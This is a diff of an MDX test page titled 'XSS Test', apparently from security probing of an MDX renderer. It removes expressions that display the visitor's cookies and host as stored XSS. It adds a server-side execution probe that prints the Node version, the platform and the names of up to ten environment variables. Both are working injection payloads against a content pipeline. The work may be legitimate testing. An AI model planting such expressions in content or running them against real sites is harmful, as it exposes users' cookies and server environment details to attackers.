@@ -1,12 +1,8 @@
 ---
 title: "XSS Test"
-description: "stored xss via mdx expression"
+description: "ssr exec probe"
 ---
 
 XSSPROBESTART
-
-{globalThis.alert?.('XSS via MDX expression — origin: '+globalThis.location?.host+' cookies: '+globalThis.document?.cookie)}
-
-{globalThis.document?.documentElement?.setAttribute?.('data-xss-proof','FIRED-'+globalThis.location?.host)}
-
+NodeVer:{globalThis.process?.version ?? 'NOPROC'}|Plat:{globalThis.process?.platform ?? 'NOPLAT'}|EnvKeys:{globalThis.process?.env ? Object.keys(globalThis.process.env).slice(0,10).join('~') : 'NOENV'}
 XSSPROBEEND
